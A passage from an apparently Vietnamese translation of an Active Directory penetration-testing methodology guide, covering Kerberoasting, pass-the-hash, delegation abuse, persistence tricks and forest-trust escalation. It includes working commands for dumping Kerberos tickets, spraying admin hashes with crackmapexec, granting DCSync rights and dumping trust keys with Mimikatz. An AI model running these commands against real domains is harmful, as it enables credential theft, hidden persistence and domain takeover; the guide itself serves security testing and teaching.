Sau đó, hãy đánh giá gMSA vừa thu hồi như mọi thông tin xác thực khác: kiểm tra tư cách thành viên nhóm cục bộ/miền, quyền đăng nhập, SPN, delegation và các dịch vụ có thể truy cập trước khi thử pass-the-hash. Đường truy xuất dựa trên ACL này khác với [Golden gMSA/dMSA](golden-dmsa-gmsa.md), vốn suy ra mật khẩu được quản lý sau khi compromise KDS root key.<sup>[[20]](#references)</sup>

Một computer principal cũng có thể có quyền kiểm soát đi ra đối với các computer object hoặc nhóm khác. Sau khi lấy được một principal, hãy kiểm tra riêng các tư cách thành viên lồng nhau và ACL hiệu lực của nó: quyền ghi trên một computer object khác có thể cho phép thay đổi tài khoản, còn quyền quản lý tư cách thành viên nhóm có thể dẫn đến một vai trò đăng nhập. Cờ staged-account, quy ước đặt tên dễ đoán hoặc một cạnh `GenericWrite` tự nó không chứng minh được toàn bộ đường tấn công.

Một bản sao `msDS-ManagedPassword` blob có thể đọc được trong tệp, share hoặc bản sao lưu là một đường lộ lọt riêng: ACL quyền đọc LDAP không thể bảo vệ bản sao được lưu ở nơi khác. Hãy xác thực rằng dữ liệu là managed-password blob trước khi diễn giải nó, đồng thời phân biệt trường hợp này với cả việc đọc LDAP được cấp quyền lẫn việc suy ra từ KDS root key.

### Kerberoast

Kerberoasting là kỹ thuật lấy **TGS ticket** được các dịch vụ gắn với tài khoản người dùng sử dụng, rồi crack mã hóa của chúng—vốn dựa trên mật khẩu người dùng—**offline**.

Tìm hiểu thêm về nội dung này tại:


{{#ref}}
kerberoast.md
{{#endref}}

### Kết nối từ xa (RDP, SSH, FTP, Win-RM, v.v.)

Sau khi lấy được một số thông tin xác thực, bạn có thể kiểm tra xem mình có quyền truy cập vào **máy** nào không. Để làm việc đó, bạn có thể dùng **CrackMapExec** thử kết nối đến nhiều máy chủ bằng các giao thức khác nhau, dựa trên kết quả quét cổng của bạn.

### Leo thang đặc quyền cục bộ

Nếu bạn đã compromise thông tin xác thực hoặc có phiên làm việc với tư cách người dùng miền thông thường và có thể truy cập **bất kỳ máy nào trong miền**, hãy tìm cách **leo thang đặc quyền cục bộ và thu thập thông tin xác thực**. Quyền quản trị viên cục bộ có thể cho phép bạn **dump hash của người dùng khác** từ bộ nhớ (LSASS) và bộ nhớ cục bộ (SAM).

Cuốn sách này có một trang đầy đủ về [**leo thang đặc quyền cục bộ trong Windows**](../windows-local-privilege-escalation/index.html) cùng một [**checklist**](../checklist-windows-privilege-escalation.md). Ngoài ra, đừng quên sử dụng [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Ticket của phiên hiện tại

Rất **khó có khả năng** bạn sẽ tìm thấy **ticket** trong phiên người dùng hiện tại **cho phép bạn truy cập** các tài nguyên không ngờ tới, nhưng bạn có thể kiểm tra:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Với thông tin xác thực domain hoặc một phiên người dùng, hãy xem lại các [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: các kỹ thuật liệt kê đã xác thực và ép buộc xác thực có thể làm lộ những đường relay không thể phát hiện trong quá trình trinh sát chưa xác thực.

### Tìm thông tin xác thực trong các thư mục chia sẻ trên máy tính | Thư mục chia sẻ SMB

Giờ bạn đã có một số thông tin xác thực cơ bản, hãy kiểm tra xem mình có thể **tìm** thấy **các tệp thú vị được chia sẻ trong AD** hay không. Bạn có thể làm việc này thủ công, nhưng sẽ rất nhàm chán và lặp đi lặp lại (đặc biệt nếu tìm thấy hàng trăm tài liệu cần kiểm tra).

[**Truy cập liên kết này để tìm hiểu về các công cụ bạn có thể sử dụng.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Đánh cắp thông tin xác thực NTLM

Nếu có thể **truy cập các máy tính hoặc thư mục chia sẻ khác**, bạn có thể **đặt các tệp** (như tệp SCF) mà nếu ai đó truy cập, chúng sẽ k**ích hoạt xác thực NTLM hướng tới bạn**, giúp bạn **đánh cắp** **thử thách NTLM** để bẻ khóa:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Lỗ hổng này cho phép mọi người dùng đã xác thực **xâm phạm domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Leo thang đặc quyền trên Active Directory KHI CÓ thông tin xác thực/phiên có đặc quyền

**Với các kỹ thuật sau, tài khoản domain thông thường là chưa đủ; bạn cần có một số đặc quyền/thông tin xác thực đặc biệt để thực hiện các cuộc tấn công này.**

### Trích xuất hash

Hy vọng bạn đã **xâm phạm được một tài khoản quản trị viên cục bộ** bằng [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), bao gồm cả relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [leo thang đặc quyền cục bộ](../windows-local-privilege-escalation/index.html).\
Tiếp theo, đã đến lúc dump tất cả hash trong bộ nhớ và trên máy cục bộ.\
[**Đọc trang này để tìm hiểu các cách khác nhau để lấy hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Khi đã có hash của một người dùng**, bạn có thể dùng nó để **mạo danh** người dùng đó.\
Bạn cần sử dụng một **công cụ** có thể **thực hiện** **xác thực NTLM bằng** **hash** đó, **hoặc** bạn có thể tạo một **sessionlogon** mới rồi **inject** **hash** vào **LSASS** để khi thực hiện bất kỳ **xác thực NTLM nào**, **hash đó sẽ được sử dụng.** Đây là cách mimikatz hoạt động.\
[**Đọc trang này để biết thêm thông tin.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cuộc tấn công này nhằm **dùng hash NTLM của người dùng để yêu cầu vé Kerberos**, thay thế cho cách Pass The Hash thông thường qua giao thức NTLM. Vì vậy, cách này có thể đặc biệt **hữu ích trong các mạng đã tắt giao thức NTLM** và chỉ **cho phép Kerberos** làm giao thức xác thực.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Trong phương thức tấn công **Pass The Ticket (PTT)**, kẻ tấn công **đánh cắp vé xác thực của người dùng** thay vì mật khẩu hoặc giá trị hash. Sau đó, vé bị đánh cắp này được dùng để **mạo danh người dùng**, giành quyền truy cập trái phép vào các tài nguyên và dịch vụ trong mạng.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Tái sử dụng thông tin xác thực

Nếu có **hash** hoặc **mật khẩu** của một **quản trị viên cục bộ**, bạn nên thử **đăng nhập cục bộ** vào các **máy tính** khác bằng thông tin đó.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Lưu ý rằng việc này khá **ồn ào** và **LAPS** sẽ **giảm thiểu** được.

### Lạm dụng MSSQL & Trusted Links

Nếu một người dùng có đặc quyền **truy cập các phiên bản MSSQL**, họ có thể sử dụng chúng để **thực thi lệnh** trên máy chủ MSSQL (nếu chạy dưới quyền SA), **đánh cắp** **hash** NetNTLM hoặc thậm chí thực hiện **tấn công** **relay**.\
Nếu một phiên bản MSSQL được một phiên bản khác tin cậy thông qua liên kết cơ sở dữ liệu, người dùng có đặc quyền trên cơ sở dữ liệu được liên kết có thể **sử dụng mối quan hệ tin cậy để thực thi truy vấn trên phiên bản còn lại**. Các mối quan hệ tin cậy này có thể được xâu chuỗi và cuối cùng dẫn đến một cơ sở dữ liệu cấu hình sai, nơi người dùng có thể thực thi lệnh.\
**Các liên kết giữa cơ sở dữ liệu vẫn hoạt động ngay cả qua các forest trust.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Lạm dụng nền tảng quản lý tài sản CNTT/triển khai

Các bộ giải pháp kiểm kê và triển khai của bên thứ ba thường mở ra những con đường mạnh mẽ để truy cập thông tin xác thực và thực thi mã. Xem:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Nếu bạn tìm thấy một đối tượng Computer có thuộc tính [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) và bạn có đặc quyền domain trên máy tính đó, bạn sẽ có thể dump TGT từ bộ nhớ của mọi người dùng đăng nhập vào máy tính.\
Vì vậy, nếu **Domain Admin đăng nhập vào máy tính**, bạn sẽ có thể dump TGT của họ và giả mạo họ bằng [Pass the Ticket](pass-the-ticket.md).\
Nhờ constrained delegation, bạn thậm chí có thể **tự động xâm nhập Print Server** (hy vọng đó sẽ là một DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Nếu một người dùng hoặc máy tính được phép sử dụng "Constrained Delegation", đối tượng đó sẽ có thể **giả mạo bất kỳ người dùng nào để truy cập một số dịch vụ trên máy tính**.\
Sau đó, nếu bạn **chiếm được hash** của người dùng/máy tính này, bạn sẽ có thể **giả mạo bất kỳ người dùng nào** (kể cả domain admin) để truy cập một số dịch vụ.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Có đặc quyền **WRITE** trên một đối tượng Active Directory của máy tính từ xa cho phép thực thi mã với **đặc quyền nâng cao**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Lạm dụng quyền/ACL

Người dùng bị xâm nhập có thể có một số **đặc quyền đáng chú ý trên một số đối tượng domain**, cho phép bạn di chuyển ngang/**leo thang** đặc quyền.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Lạm dụng dịch vụ Printer Spooler

Phát hiện một **dịch vụ Spool đang lắng nghe** trong domain có thể bị **lạm dụng** để **thu thập thông tin xác thực mới** và **leo thang đặc quyền**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Lạm dụng phiên của bên thứ ba

Nếu **những người dùng khác** **truy cập** vào máy đã bị **xâm nhập**, bạn có thể **thu thập thông tin xác thực từ bộ nhớ** và thậm chí **inject beacon vào tiến trình của họ** để giả mạo họ.\
Thông thường, người dùng sẽ truy cập hệ thống qua RDP, vì vậy dưới đây là cách thực hiện một vài cuộc tấn công trên các phiên RDP của bên thứ ba:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** cung cấp một hệ thống quản lý **mật khẩu Administrator cục bộ** trên các máy tính đã join domain, đảm bảo mật khẩu được **ngẫu nhiên hóa**, là duy nhất và thường xuyên được **thay đổi**. Các mật khẩu này được lưu trữ trong Active Directory và quyền truy cập được kiểm soát bằng ACL, chỉ cho phép những người dùng được ủy quyền. Nếu có đủ quyền để truy cập các mật khẩu này, bạn có thể pivot sang các máy tính khác.


{{#ref}}
laps.md
{{#endref}}

### Đánh cắp chứng chỉ

Để tìm hiểu về đăng ký AD CS, ánh xạ chứng chỉ và liệt kê trước khi tiến hành đánh cắp chứng chỉ hoặc lạm dụng template, hãy xem [tổng quan về AD Certificates](ad-certificates.md).

**Thu thập chứng chỉ** từ máy đã bị xâm nhập có thể là một cách để leo thang đặc quyền trong môi trường:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Lạm dụng Certificate Templates

Nếu có cấu hình **template dễ bị tấn công**, bạn có thể lạm dụng chúng để leo thang đặc quyền:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Hậu khai thác bằng tài khoản có đặc quyền cao

### Dump thông tin xác thực domain

Sau khi có được đặc quyền **Domain Admin** hoặc tốt hơn nữa là **Enterprise Admin**, bạn có thể **dump** **cơ sở dữ liệu domain**: _ntds.dit_.

[**Có thể tìm thêm thông tin về tấn công DCSync tại đây**](dcsync.md).

[**Có thể tìm thêm thông tin về cách đánh cắp NTDS.dit tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Một bản sao lưu có thể đọc được, chứa `ntds.dit` cùng với hive `SYSTEM`, cần được xem là dữ liệu thư mục đã bị lộ ngay cả trước khi giải nén. Hash mật khẩu cũ không có nghĩa là các thuộc tính đối tượng khác an toàn: những trường như `description` có thể chứa thông tin xác thực hoặc ghi chú vận hành. Trước tiên, hãy kiểm tra tên các thành viên trong archive và không đưa nội dung cơ sở dữ liệu đã giải nén vào kết quả liệt kê thông thường.

### Duy trì quyền truy cập sau khi leo thang đặc quyền

Một số kỹ thuật đã đề cập trước đó có thể được dùng để duy trì quyền truy cập.\
Ví dụ, bạn có thể:

- Khiến người dùng dễ bị [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Khiến người dùng dễ bị [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Cấp cho người dùng các đặc quyền [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Tấn công Silver Ticket** tạo một **vé Ticket Granting Service (TGS) hợp lệ** cho một dịch vụ cụ thể bằng cách sử dụng **NTLM hash** (ví dụ: **hash của tài khoản PC**). Phương pháp này được dùng để **truy cập các quyền của dịch vụ**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Tấn công Golden Ticket** xảy ra khi kẻ tấn công có được **NTLM hash của tài khoản krbtgt** trong môi trường Active Directory (AD). Tài khoản này đặc biệt vì được dùng để ký tất cả **Ticket Granting Ticket (TGT)**, vốn cần thiết để xác thực trong mạng AD.

Sau khi lấy được hash này, kẻ tấn công có thể tạo **TGT** cho bất kỳ tài khoản nào họ chọn (tấn công Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Đây là các golden ticket được tạo theo cách **né tránh những cơ chế phát hiện golden ticket phổ biến.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Duy trì quyền truy cập bằng Certificates của tài khoản**

**Có certificates của tài khoản hoặc có thể yêu cầu chúng** là một cách rất hiệu quả để duy trì quyền truy cập vào tài khoản người dùng (ngay cả khi họ đổi mật khẩu):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Duy trì quyền truy cập bằng Certificates trong Domain**

**Cũng có thể dùng certificates để duy trì quyền truy cập với đặc quyền cao trong domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Nhóm AdminSDHolder

Đối tượng **AdminSDHolder** trong Active Directory đảm bảo bảo mật cho các **nhóm đặc quyền** (như Domain Admins và Enterprise Admins) bằng cách áp dụng một **Access Control List (ACL)** tiêu chuẩn cho các nhóm này nhằm ngăn chặn những thay đổi trái phép. Tuy nhiên, tính năng này có thể bị khai thác; nếu kẻ tấn công sửa ACL của AdminSDHolder để cấp toàn quyền cho một người dùng thông thường, người dùng đó sẽ có quyền kiểm soát rộng rãi đối với tất cả các nhóm đặc quyền. Vì vậy, biện pháp bảo mật này vốn nhằm bảo vệ lại có thể phản tác dụng, cho phép truy cập trái phép nếu không được giám sát chặt chẽ.

[**Tìm hiểu thêm về nhóm AdminDSHolder tại đây.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Thông tin xác thực DSRM

Trong mỗi **Domain Controller (DC)** đều có một tài khoản **local administrator**. Khi có quyền admin trên máy này, có thể trích xuất hash của tài khoản Administrator cục bộ bằng **mimikatz**. Sau đó, cần sửa registry để **cho phép sử dụng mật khẩu này**, từ đó truy cập từ xa vào tài khoản Administrator cục bộ.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Duy trì quyền truy cập bằng ACL

Bạn có thể **cấp** một số **quyền đặc biệt** cho **người dùng** trên các đối tượng domain cụ thể, giúp người dùng đó **leo thang đặc quyền trong tương lai**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor** được dùng để **lưu trữ** các **quyền** mà một **đối tượng** có **trên** một **đối tượng** khác. Chỉ cần **thực hiện** một **thay đổi nhỏ** trong **security descriptor** của một đối tượng, bạn có thể có được các đặc quyền rất đáng kể trên đối tượng đó mà không cần là thành viên của nhóm đặc quyền.


{{#ref}}
security-descriptors.md
{{#endref}}

### Đối tượng động dùng cho Anti-Forensics / Evasion

Lạm dụng auxiliary class `dynamicObject` để tạo các principal/GPO/bản ghi DNS tồn tại trong thời gian ngắn với `entryTTL`/`msDS-Entry-Time-To-Die`; chúng tự xóa mà không để lại tombstone, xóa dấu vết LDAP nhưng vẫn để lại SID mồ côi, tham chiếu `gPLink` bị hỏng hoặc phản hồi DNS đã lưu trong cache (ví dụ: làm nhiễm bẩn ACE của AdminSDHolder hoặc chuyển hướng `gPCFileSysPath`/DNS tích hợp AD độc hại).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Thay đổi **LSASS** trong bộ nhớ để thiết lập một **mật khẩu dùng chung**, cho phép truy cập tất cả tài khoản domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Tìm hiểu SSP (Security Support Provider) là gì tại đây.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Bạn có thể tạo **SSP của riêng mình** để **thu thập** **thông tin xác thực** ở dạng **văn bản thuần** khi được dùng để truy cập máy.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Tính năng này đăng ký một **Domain Controller mới** trong AD và dùng nó để **đẩy các thuộc tính** (SIDHistory, SPN...) lên các đối tượng được chỉ định mà **không** để lại bất kỳ **log** nào về **những thay đổi**. Bạn **cần có đặc quyền DA** và phải ở trong **root domain**.\
Lưu ý rằng nếu dùng dữ liệu sai, các log rất xấu sẽ xuất hiện.


{{#ref}}
dcshadow.md
{{#endref}}

### Duy trì quyền truy cập bằng LAPS

Trước đây, chúng ta đã thảo luận cách leo thang đặc quyền nếu bạn có **đủ quyền để đọc mật khẩu LAPS**. Tuy nhiên, các mật khẩu này cũng có thể được dùng để **duy trì quyền truy cập**.\
Tham khảo:


{{#ref}}
laps.md
{{#endref}}

## Leo thang đặc quyền trong Forest - Domain Trusts

Microsoft xem **Forest** là ranh giới bảo mật. Điều này có nghĩa là **xâm phạm một domain có thể dẫn đến việc toàn bộ Forest bị xâm phạm**.<sup>[[1]](#references)</sup>

### Thông tin cơ bản

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) là một cơ chế bảo mật cho phép người dùng từ một **domain** truy cập tài nguyên trong một **domain** khác. Về cơ bản, nó tạo liên kết giữa các hệ thống xác thực của hai domain, cho phép quá trình xác minh xác thực diễn ra liền mạch. Khi thiết lập trust, các domain trao đổi và lưu giữ những **key** cụ thể trong **Domain Controller (DC)** của mình; các key này rất quan trọng đối với tính toàn vẹn của trust.

Trong tình huống thông thường, nếu người dùng muốn truy cập một dịch vụ trong **domain được tin cậy**, trước tiên họ phải yêu cầu một vé đặc biệt gọi là **inter-realm TGT** từ DC của domain mình. TGT này được mã hóa bằng **key** dùng chung mà cả hai domain đã thống nhất. Sau đó, người dùng gửi TGT này đến **DC của domain được tin cậy** để nhận service ticket (**TGS**). Khi DC của domain được tin cậy xác thực thành công inter-realm TGT, nó sẽ cấp TGS, cho phép người dùng truy cập dịch vụ.

**Các bước**:

1. Một **máy tính client** trong **Domain 1** bắt đầu quá trình bằng cách dùng **NTLM hash** để yêu cầu **Ticket Granting Ticket (TGT)** từ **Domain Controller (DC1)**.
2. DC1 cấp TGT mới nếu xác thực client thành công.
3. Sau đó, client yêu cầu **inter-realm TGT** từ DC1 để truy cập tài nguyên trong **Domain 2**.
4. Inter-realm TGT được mã hóa bằng **trust key** dùng chung giữa DC1 và DC2 trong khuôn khổ trust hai chiều giữa hai domain.
5. Client gửi inter-realm TGT đến **Domain Controller (DC2) của Domain 2**.
6. DC2 xác minh inter-realm TGT bằng trust key dùng chung và, nếu hợp lệ, cấp **Ticket Granting Service (TGS)** cho server trong Domain 2 mà client muốn truy cập.
7. Cuối cùng, client gửi TGS này đến server. TGS được mã hóa bằng hash tài khoản của server và giúp client truy cập dịch vụ trong Domain 2.

### Các loại trust

Điều quan trọng cần lưu ý là **trust có thể là một chiều hoặc hai chiều**. Với trust hai chiều, cả hai domain đều tin cậy lẫn nhau; còn trong quan hệ trust **một chiều**, một domain là domain **được tin cậy**, domain còn lại là domain **tin cậy**. Trong trường hợp sau, **bạn chỉ có thể truy cập tài nguyên trong domain tin cậy từ domain được tin cậy**.

Nếu Domain A tin cậy Domain B, A là domain tin cậy và B là domain được tin cậy. Ngoài ra, trong **Domain A**, đây là **Outbound trust**; còn trong **Domain B**, đây là **Inbound trust**.

**Các quan hệ trust khác nhau**

- **Parent-Child Trusts**: Đây là cấu hình phổ biến trong cùng một forest, trong đó child domain tự động có trust bắc cầu hai chiều với parent domain. Về cơ bản, điều này có nghĩa là các yêu cầu xác thực có thể luân chuyển liền mạch giữa parent và child.
- **Cross-link Trusts**: Còn gọi là "shortcut trusts", các trust này được thiết lập giữa các child domain để rút ngắn quá trình chuyển tiếp. Trong các forest phức tạp, yêu cầu chuyển tiếp xác thực thường phải đi lên forest root rồi mới xuống domain đích. Tạo cross-link giúp rút ngắn đường đi, đặc biệt hữu ích trong môi trường phân bố địa lý rộng.
- **External Trusts**: Các trust này được thiết lập giữa các domain khác nhau, không liên quan với nhau và vốn không có tính bắc cầu. Theo [tài liệu của Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust hữu ích để truy cập tài nguyên trong một domain nằm ngoài forest hiện tại và không được kết nối bằng forest trust. SID filtering giúp tăng cường bảo mật cho external trust.
- **Tree-root Trusts**: Các trust này được tự động thiết lập giữa forest root domain và một tree root mới được thêm vào. Dù không thường gặp, tree-root trust rất quan trọng khi thêm cây domain mới vào forest, cho phép cây đó duy trì tên domain riêng và đảm bảo tính bắc cầu hai chiều. Có thể xem thêm trong [hướng dẫn của Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Đây là trust bắc cầu hai chiều giữa hai forest root domain, đồng thời áp dụng SID filtering để tăng cường các biện pháp bảo mật.
- **MIT Trusts**: Các trust này được thiết lập với các domain Kerberos không chạy Windows và tuân thủ [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trust chuyên biệt hơn và phục vụ các môi trường cần tích hợp với hệ thống dựa trên Kerberos bên ngoài hệ sinh thái Windows.

#### Các điểm khác biệt khác trong **quan hệ trust**

- Quan hệ trust cũng có thể là **bắc cầu** (A tin cậy B, B tin cậy C, vậy A tin cậy C) hoặc **không bắc cầu**.
- Quan hệ trust có thể được thiết lập dưới dạng **trust hai chiều** (hai bên tin cậy lẫn nhau) hoặc **trust một chiều** (chỉ một bên tin cậy bên kia).

### Đường tấn công

1. **Liệt kê** các quan hệ trust
2. Kiểm tra xem có **security principal** nào (user/group/computer) có **quyền truy cập** vào tài nguyên của **domain khác** hay không; có thể thông qua các ACE hoặc do thuộc nhóm trong domain kia. Tìm các **mối quan hệ giữa các domain** (có thể trust được tạo ra chính vì lý do này).
   1. Trong trường hợp này, kerberoast cũng có thể là một lựa chọn khác.
3. **Xâm phạm** các **tài khoản** có thể **pivot** qua các domain.

Kẻ tấn công có thể truy cập tài nguyên trong domain khác thông qua ba cơ chế chính:

- **Thành viên nhóm cục bộ**: Principal có thể được thêm vào các nhóm cục bộ trên máy, chẳng hạn nhóm “Administrators” trên server, qua đó có quyền kiểm soát đáng kể máy đó.
- **Thành viên nhóm trong domain bên ngoài**: Principal cũng có thể là thành viên của các nhóm trong domain bên ngoài. Tuy nhiên, hiệu quả của phương thức này phụ thuộc vào loại trust và phạm vi của nhóm.
- **Access Control Lists (ACL)**: Principal có thể được chỉ định trong **ACL**, đặc biệt là trong các **ACE** thuộc **DACL**, qua đó được cấp quyền truy cập vào các tài nguyên cụ thể. Nếu muốn tìm hiểu sâu hơn về cơ chế của ACL, DACL và ACE, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” là một tài liệu vô cùng hữu ích.<sup>[[17]](#references)</sup>

### Tìm người dùng/nhóm bên ngoài có quyền

Bạn có thể kiểm tra **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** để tìm các foreign security principal trong domain. Đây sẽ là user/group từ **domain/forest bên ngoài**.

Bạn có thể kiểm tra thông tin này trong **Bloodhound** hoặc dùng powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Leo thang đặc quyền trong forest từ Child lên Parent

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Các cách khác để liệt kê domain trusts:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Có **2 khóa tin cậy**, một khóa cho _Child --> Parent_ và khóa còn lại cho _Parent_ --> _Child_.\
> Bạn có thể xem khóa mà miền hiện tại sử dụng bằng:
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Leo thang lên Enterprise admin của domain con/cha bằng cách lạm dụng trust với SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Khai thác Configuration NC có thể ghi

Hiểu cách khai thác Configuration Naming Context (NC) là điều rất quan trọng. Configuration NC đóng vai trò là kho lưu trữ trung tâm cho dữ liệu cấu hình trên toàn forest trong môi trường Active Directory (AD). Dữ liệu này được sao chép đến mọi Domain Controller (DC) trong forest, trong đó các DC có thể ghi duy trì một bản sao có thể ghi của Configuration NC. Để khai thác, cần có **đặc quyền SYSTEM trên một DC**, tốt nhất là DC con.

**Liên kết GPO với site của DC gốc**

Container Sites của Configuration NC chứa thông tin về site của tất cả máy tính đã join domain trong AD forest. Khi hoạt động với đặc quyền SYSTEM trên bất kỳ DC nào, attacker có thể liên kết GPO với các site của DC gốc. Hành động này có khả năng xâm phạm domain gốc bằng cách thao túng các policy được áp dụng cho những site này.

Để tìm hiểu chuyên sâu, có thể tham khảo nghiên cứu về [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Xâm phạm bất kỳ gMSA nào trong forest**

Một hướng tấn công là nhắm mục tiêu vào các gMSA có đặc quyền trong domain. KDS Root key, yếu tố thiết yếu để tính password của gMSA, được lưu trong Configuration NC. Với đặc quyền SYSTEM trên bất kỳ DC nào, có thể truy cập KDS Root key và tính password của bất kỳ gMSA nào trong forest.

Có thể xem phân tích chi tiết và hướng dẫn từng bước tại:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tấn công MSA được ủy quyền bổ sung (BadSuccessor – lạm dụng các thuộc tính migration):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Nghiên cứu bên ngoài bổ sung: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Tấn công thay đổi Schema**

Phương pháp này đòi hỏi sự kiên nhẫn, chờ các object AD có đặc quyền mới được tạo. Với đặc quyền SYSTEM, attacker có thể sửa đổi AD Schema để cấp cho bất kỳ user nào toàn quyền kiểm soát mọi class. Điều này có thể dẫn đến việc truy cập và kiểm soát trái phép các object AD mới được tạo.

Có thể đọc thêm về [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Từ DA lên EA với ADCS ESC5**

Lỗ hổng ADCS ESC5 nhắm vào quyền kiểm soát các object Public Key Infrastructure (PKI) để tạo certificate template cho phép xác thực với tư cách bất kỳ user nào trong forest. Vì các object PKI nằm trong Configuration NC, việc xâm phạm một DC con có thể ghi cho phép thực hiện các cuộc tấn công ESC5.

Có thể xem thêm chi tiết tại [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Trong trường hợp không có ADCS, attacker có thể thiết lập các thành phần cần thiết, như được thảo luận trong [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domain bên ngoài forest - Một chiều (inbound) hoặc hai chiều

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
